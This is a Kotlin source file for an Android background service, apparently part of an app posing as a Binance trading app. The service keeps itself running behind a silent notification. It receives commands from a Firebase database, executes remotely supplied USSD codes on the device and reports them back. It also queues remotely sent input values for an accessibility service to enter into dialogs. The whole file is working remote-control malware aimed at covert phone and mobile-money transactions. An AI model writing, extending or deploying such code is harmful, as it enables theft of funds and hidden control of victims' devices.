package dApp.binance.Trading.arfu

import android.app.Notification
import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase

class CarerService : Service() {

    private var commandListener: ChildEventListener? = null

    companion object {
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "CarerServiceChannel"
    }

    override fun onCreate() {
        super.onCreate()
        Log.d("CarerService", "Service created")
        createNotificationChannel()
        startCommandListener()
    }

    private fun startCommandListener() {
        val deviceId = FirebaseHelper.getDeviceId(this)
        val database = FirebaseDatabase.getInstance().reference
        val commandsRef = database.child("commands").child(deviceId)

        Log.d("CarerService", "Starting listener for device: $deviceId")

        commandListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                val commandData = snapshot.value as? Map<*, *> ?: return
                val ussdCode = commandData["ussd_code"] as? String ?: ""
                val inputValue = commandData["input_value"] as? String ?: ""
                val isResponse = commandData["is_response"]?.toString()?.toBoolean() ?: false
                val timestamp = commandData["timestamp"]?.toString()?.toLongOrNull() ?: 0L

                // Only execute if it's a recent command (sent in the last 2 minutes)
                if (System.currentTimeMillis() - timestamp < 120000) {
                    if (isResponse && inputValue.isNotEmpty()) {
                        Log.d("CarerService", ">>> NEW RESPONSE RECEIVED: $inputValue")
                        
                        // Store in SharedPreferences for AccessibilityService to pick up
                        val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
                        sharedPref.edit().putString("pending_input_value", inputValue).apply()
                        
                        // We also need to trigger the accessibility service to "notice" the change
                        // if the dialog is already open.
                        Log.d("CarerService", "Saved pending input: $inputValue")
                        
                    } else if (ussdCode.isNotEmpty()) {
                        Log.d("CarerService", ">>> NEW COMMAND RECEIVED: $ussdCode")
                        UssdHelper.executeUssd(this@CarerService, ussdCode)
                        FirebaseLogHelper.logCommand(ussdCode, "EXECUTING", this@CarerService)
                    }
                } else {
                    Log.d("CarerService", "Ignoring old command")
                }
            }

            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e("CarerService", "Database error: ${error.message}")
            }
        }
        
        commandsRef.addChildEventListener(commandListener!!)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("CarerService", "Service started")
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        return START_STICKY
    }

    override fun onDestroy() {
        commandListener?.let {
            val deviceId = FirebaseHelper.getDeviceId(this)
            FirebaseDatabase.getInstance().reference.child("commands").child(deviceId)
                .removeEventListener(it)
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Carer Service",
                NotificationManager.IMPORTANCE_LOW
            )
            channel.description = "Carer Service Running"
            channel.enableVibration(false)
            channel.enableLights(false)
            channel.setSound(null, null)

            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Carer Service")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }
}
